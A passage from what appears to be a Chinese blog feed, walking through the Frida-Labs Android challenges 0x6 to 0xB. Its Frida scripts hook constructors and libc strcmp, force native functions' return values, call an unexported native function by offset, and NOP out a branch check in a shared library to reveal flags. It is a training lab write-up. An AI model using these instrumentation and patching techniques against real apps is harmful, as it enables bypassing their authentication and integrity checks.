class="keyword">var</span> checker = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.ad2001.frida0x6.Checker&quot;</span>);</span><br><span class="line">            <span class="keyword">var</span> C_New = checker.$new();</span><br><span class="line">            C_New.<span class="property">num1</span>.<span class="property">value</span> = <span class="number">0x4D2</span>;</span><br><span class="line">            C_New.<span class="property">num2</span>.<span class="property">value</span> = <span class="number">0x10E1</span>;</span><br><span class="line"></span><br><span class="line">            instance.<span class="title function_">get_flag</span>(C_New);        </span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">onComplete</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Frida-0x7"><a href="#Frida-0x7" class="headerlink" title="Frida 0x7"></a>Frida 0x7</h2><p>与上题不同的是</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202512032045843.png" alt="image-20251203204502792"></p><p>法一，同上题，无非是多了个构造函数，我们按构造函数传参即可</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">frida_7</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&#x27;com.ad2001.frida0x7.MainActivity&#x27;</span>,&#123;</span><br><span class="line">        <span class="attr">onMatch</span>: <span class="keyword">function</span>(<span class="params">instance</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> checker = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.ad2001.frida0x7.Checker&quot;</span>);</span><br><span class="line">            <span class="keyword">var</span> C_New = checker.$new(<span class="number">0x201</span>,<span class="number">0x201</span>);</span><br><span class="line">            instance.<span class="title function_">flag</span>(C_New);        </span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">onComplete</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>法2：hook构造函数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">frida_7_5</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> a = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.ad2001.frida0x7.Checker&quot;</span>);</span><br><span class="line">    a.<span class="property">$init</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">param</span>)&#123; </span><br><span class="line">        <span class="variable language_">this</span>.$init(<span class="number">0x201</span>,<span class="number">0x201</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Frida-0x8"><a href="#Frida-0x8" class="headerlink" title="Frida 0x8"></a>Frida 0x8</h2><p>cmpstr来自so层</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202512032058323.png" alt="image-20251203205838224"></p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202512032100385.png" alt="image-20251203210004300"></p><p>可以看到Java_com_ad2001_frida0x8_MainActivity_cmpstr中获取了我们的输入，并将这段输入使用strcmp函数与一段密文s2进行比较，当它们相等时，将会返回0</p><p>所以我们可以直接hook strcmp函数，输出他的两个参数，第二个参数就是密文了</p><p>需要输入Closure</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">frida_1</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="title class_">MainActivity</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.ad2001.frida0x1.MainActivity&quot;</span>);</span><br><span class="line">    <span class="title class_">MainActivity</span>.<span class="property">check</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">i, i2</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;check is called&#x27;</span> + <span class="string">&#x27;, &#x27;</span> + <span class="string">&#x27;i: &#x27;</span> + i + <span class="string">&#x27;, &#x27;</span> + <span class="string">&#x27;i2: &#x27;</span> + i2);</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">check</span>(<span class="number">1</span>, <span class="number">6</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">frida_2</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="title class_">MainActivity</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.ad2001.frida0x2.MainActivity&quot;</span>);</span><br><span class="line">    <span class="title class_">MainActivity</span>.<span class="title function_">get_flag</span>(<span class="number">4919</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">frida_3</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="title class_">Checker</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.ad2001.frida0x3.Checker&quot;</span>);</span><br><span class="line">    <span class="title class_">Checker</span>.<span class="property">code</span>.<span class="property">value</span> = <span class="number">0x200</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">frida_4</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> a = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.ad2001.frida0x4.Check&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> check = a.$new();</span><br><span class="line">    <span class="keyword">var</span> flag = check.<span class="title function_">get_flag</span>(<span class="number">0x539</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;flag: &quot;</span>,flag);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">frida_5</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&#x27;com.ad2001.frida0x5.MainActivity&#x27;</span>,&#123;</span><br><span class="line">        <span class="attr">onMatch</span>: <span class="keyword">function</span>(<span class="params">instance</span>)&#123;</span><br><span class="line">            instance.<span class="title function_">flag</span>(<span class="number">1337</span>)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">onComplete</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">frida_6</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&#x27;com.ad2001.frida0x6.MainActivity&#x27;</span>,&#123;</span><br><span class="line">        <span class="attr">onMatch</span>: <span class="keyword">function</span>(<span class="params">instance</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> checker = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.ad2001.frida0x6.Checker&quot;</span>);</span><br><span class="line">            <span class="keyword">var</span> C_New = checker.$new();</span><br><span class="line">            C_New.<span class="property">num1</span>.<span class="property">value</span> = <span class="number">0x4D2</span>;</span><br><span class="line">            C_New.<span class="property">num2</span>.<span class="property">value</span> = <span class="number">0x10E1</span>;</span><br><span class="line"></span><br><span class="line">            instance.<span class="title function_">get_flag</span>(C_New);        </span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">onComplete</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">frida_7</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&#x27;com.ad2001.frida0x7.MainActivity&#x27;</span>,&#123;</span><br><span class="line">        <span class="attr">onMatch</span>: <span class="keyword">function</span>(<span class="params">instance</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> checker = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.ad2001.frida0x7.Checker&quot;</span>);</span><br><span class="line">            <span class="keyword">var</span> C_New = checker.$new(<span class="number">0x201</span>,<span class="number">0x201</span>);</span><br><span class="line">            instance.<span class="title function_">flag</span>(C_New);        </span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">onComplete</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">frida_7_5</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> a = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.ad2001.frida0x7.Checker&quot;</span>);</span><br><span class="line">    a.<span class="property">$init</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">param</span>)&#123; </span><br><span class="line">        <span class="variable language_">this</span>.$init(<span class="number">0x201</span>,<span class="number">0x201</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">frida_8</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">//枚举所有导出函数</span></span><br><span class="line">    <span class="keyword">var</span> all_0x8_exp = <span class="title class_">Module</span>.<span class="title function_">enumerateExports</span>(<span class="string">&quot;libfrida0x8.so&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;libfrida0x8.so 所有导出函数：\n&quot;</span>,<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(all_0x8_exp, <span class="literal">null</span>, <span class="number">2</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">//从lib中寻找指定函数的地址，若不知道lib名称可以传NULL，找不到会抛出异常</span></span><br><span class="line">    <span class="keyword">var</span> cmpstr_addr = <span class="title class_">Module</span>.<span class="title function_">getExportByName</span>(<span class="string">&quot;libfrida0x8.so&quot;</span>,<span class="string">&quot;Java_com_ad2001_frida0x8_MainActivity_cmpstr&quot;</span>)</span><br><span class="line">    <span class="keyword">var</span> strcmp_addr = <span class="title class_">Module</span>.<span class="title function_">getExportByName</span>(<span class="string">&quot;libc.so&quot;</span>, <span class="string">&quot;strcmp&quot;</span>)</span><br><span class="line">    <span class="keyword">var</span> strcmp_null_addr = <span class="title class_">Module</span>.<span class="title function_">getExportByName</span>(<span class="literal">null</span>, <span class="string">&quot;strcmp&quot;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\ncmpstr_addr:&quot;</span>,cmpstr_addr);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;strcmp_addr:&quot;</span>,strcmp_addr);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;strcmp_null_addr:&quot;</span>,strcmp_null_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//功能与getExportByName相同，找不到返回null</span></span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">Closure</span>_addr = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libfrida0x8.so&quot;</span>,<span class="string">&quot;Closure&quot;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Closure_addr:&quot;</span>,<span class="title class_">Closure</span>_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取基地址</span></span><br><span class="line">    <span class="keyword">var</span> libc_base = <span class="title class_">Module</span>.<span class="title function_">getBaseAddress</span>(<span class="string">&quot;libfrida0x8.so&quot;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;libc_base:&quot;</span>,libc_base);</span><br><span class="line">    <span class="keyword">var</span> libc_base_add_cmpstr = <span class="title class_">Module</span>.<span class="title function_">getBaseAddress</span>(<span class="string">&quot;libfrida0x8.so&quot;</span>).<span class="title function_">add</span>(<span class="number">0x8c0</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;libc_base_add_cmpstr:&quot;</span>,libc_base_add_cmpstr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取所有导入</span></span><br><span class="line">    <span class="keyword">var</span> all_0x8_imp = <span class="title class_">Module</span>.<span class="title function_">enumerateImports</span>(<span class="string">&quot;libfrida0x8.so&quot;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;libfrida0x8.so 所有导入函数：\n&quot;</span>,<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(all_0x8_imp, <span class="literal">null</span>, <span class="number">2</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> strcmp_addr = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libc.so&quot;</span>, <span class="string">&quot;strcmp&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> out_put; <span class="comment">//全局变量，接收第一个参数</span></span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(strcmp_addr, &#123; <span class="comment">//将回调附加到指定的函数地址</span></span><br><span class="line">        <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123; <span class="comment">//进入回调函数时调用</span></span><br><span class="line">            <span class="keyword">var</span> arg0 = <span class="title class_">Memory</span>.<span class="title function_">readUtf8String</span>(args[<span class="number">0</span>]); </span><br><span class="line">            <span class="keyword">var</span> flag = <span class="title class_">Memory</span>.<span class="title function_">readUtf8String</span>(args[<span class="number">1</span>]);</span><br><span class="line">            out_put = arg0;</span><br><span class="line">            <span class="keyword">if</span> (arg0.<span class="title function_">includes</span>(<span class="string">&quot;Closure&quot;</span>)) &#123; <span class="comment">//过滤器</span></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;args[0]: &quot;</span>,arg0);</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;args[1]: &quot;</span>,flag);</span><br><span class="line">            &#125;</span><br><span class="line">                    </span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">retval</span>) &#123; <span class="comment">//退出后调用</span></span><br><span class="line">            <span class="keyword">if</span> (out_put.<span class="title function_">includes</span>(<span class="string">&quot;Closure&quot;</span>)) &#123; <span class="comment">//过滤器，根据第一个参数的值，防止修改所有的strcmp</span></span><br><span class="line">                retval.<span class="title function_">replace</span>(<span class="number">0</span>); <span class="comment">//返回0</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">frida_8</span>();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="Frida-0x9"><a href="#Frida-0x9" class="headerlink" title="Frida 0x9"></a>Frida 0x9</h2><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202512032111233.png" alt="image-20251203211113158"></p><p>checkflag返回1</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202512032111377.png" alt="image-20251203211138241"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">frida_9</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> flag_addr = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;liba0x9.so&quot;</span>, <span class="string">&quot;Java_com_ad2001_a0x9_MainActivity_check_1flag&quot;</span>);</span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(flag_addr, &#123; </span><br><span class="line">        <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123; </span><br><span class="line">                    </span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">retval</span>) &#123; </span><br><span class="line">            retval.<span class="title function_">replace</span>(<span class="number">0x539</span>); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Frida-0xA"><a href="#Frida-0xA" class="headerlink" title="Frida 0xA"></a>Frida 0xA</h2><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202512032119782.png" alt="image-20251203211958615"></p><p>没有什么，但是so层有个get_flag需要主动调用才能输出flag</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">frida_A</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> get_flag_addr = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libfrida0xa.so&quot;</span>,<span class="string">&quot;get_flag&quot;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;get_flag_addr:&quot;</span>,get_flag_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//主动调用一个没有被导入的函数需要通过基地址+偏移的方式</span></span><br><span class="line">    <span class="keyword">var</span> get_flag_addr = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libfrida0xa.so&quot;</span>).<span class="title function_">add</span>(<span class="number">0x206B0</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;get_flag_addr:&quot;</span>,get_flag_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建NativePointer对象</span></span><br><span class="line">    <span class="keyword">var</span> get_flag_ptr = <span class="keyword">new</span> <span class="title class_">NativePointer</span>(get_flag_addr);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//创建NativeFunction对象，参数为NativePointer对象，返回类型，原函数参数</span></span><br><span class="line">    <span class="keyword">const</span> get_flag = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(get_flag_ptr, <span class="string">&#x27;void&#x27;</span>, [<span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;int&#x27;</span>]);</span><br><span class="line">    <span class="title function_">get_flag</span>(<span class="number">1</span>,<span class="number">2</span>); <span class="comment">//主动调用</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">frida_A</span>();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="Frida-0xB"><a href="#Frida-0xB" class="headerlink" title="Frida 0xB"></a>Frida 0xB</h2><p>程序加载了frida0xb库，引用getFlag函数，点击按钮将调用getFlag函数：</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202512032132242.png" alt="image-20251203213240071"></p><p>定位到getflag</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202512032134447.png" alt="image-20251203213423304"></p><p>能看到在汇编中对比了0xDEADBEEF和0x539，这当然是不相等的</p><p>程序将会直接返回，我们需要让getFlag执行关于flag的相关代码，将JNZ改为JMP或者修改0xDEADBEEF为0x539，或者nop掉相关校验逻辑</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202512032210148.png" alt="image-20251203221012066"></p><p>nop完为</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202512032210623.png" alt="image-20251203221003539"></p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202512032210911.png" alt="image-20251203221034830"></p><p>我这是Arm架构的使用Arm64Writer(真机)</p><p>x86_64可以看<a href="https://zh-closure.github.io/2024/07/12/%E9%80%9A%E8%BF%87Frida-Labs%E5%85%A5%E9%97%A8Frida/#Frida-0xB">通过Frida-Labs入门Frida | Closure</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">frida_B</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> soName = <span class="string">&quot;libfrida0xb.so&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> base = <span class="title class_">Module</span>.<span class="title function_">getBaseAddress</span>(soName);</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;arch:&quot;</span>, <span class="title class_">Process</span>.<span class="property">arch</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;base:&quot;</span>, base);</span><br><span class="line">    <span class="keyword">var</span> offset = <span class="number">0x15248</span>;</span><br><span class="line">    <span class="keyword">var</span> target = base.<span class="title function_">add</span>(offset);</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;patch addr:&quot;</span>, target);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 看一下原来是什么指令</span></span><br><span class="line">    <span class="keyword">var</span> orig = <span class="title class_">Instruction</span>.<span class="title function_">parse</span>(target);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;before:&quot;</span>, orig.<span class="title function_">toString</span>());</span><br><span class="line">    <span class="keyword">var</span> orig2 = <span class="title class_">Instruction</span>.<span class="title function_">parse</span>(base.<span class="title function_">add</span>(<span class="number">0x000000000001524C</span>));</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;before2:&quot;</span>, orig2.<span class="title function_">toString</span>());</span><br><span class="line"></span><br><span class="line">    <span class="title class_">Memory</span>.<span class="title function_">patchCode</span>(target, <span class="number">1</span>, <span class="keyword">function</span> (<span class="params">code</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> cw = <span class="keyword">new</span> <span class="title class_">Arm64Writer</span>(code, &#123; <span class="attr">pc</span>: target &#125;);</span><br><span class="line">        cw.<span class="title function_">putNop</span>();   <span class="comment">// 把原来的 B.NE 改成 NOP</span></span><br><span class="line">        cw.<span class="title function_">flush</span>();</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> now = <span class="title class_">Instruction</span>.<span class="title function_">parse</span>(target);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;after:&quot;</span>, now.<span class="title function_">toString</span>());</span><br><span class="line">    <span class="keyword">var</span> now2 = <span class="title class_">Instruction</span>.<span class="title function_">parse</span>(base.<span class="title function_">add</span>(<span class="number">0x000000000001524C</span>));</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;after2:&quot;</span>, now2.<span class="title function_">toString</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">frida_B</span>();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Frida-学习-Frida-Labs&quot;&gt;&lt;a href=&quot;#Frida-学习-Frida-Labs&quot; class=&quot;headerlink&quot; title=&quot;Frida 学习(Frida-Labs)&quot;&gt;&lt;/a&gt;Frida 学习(Frida-Labs)&lt;/h1&gt;&lt;p&gt;</summary>
      
    
    
    
    <category term="Android" scheme="http://matriy330.github.io/categories/Android/"/>
    
    
    <category term="Android" scheme="http://matriy330.github.io/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>AWDP FIX 及妙妙小工具</title>
    <link href="http://matriy330.github.io/8e88964a/"/>
    <id>http://matriy330.github.io/8e88964a/</id>
    <published>2025-12-02T02:15:18.000Z</published>
    <updated>2025-12-02T02:15:42.187Z</updated>
    
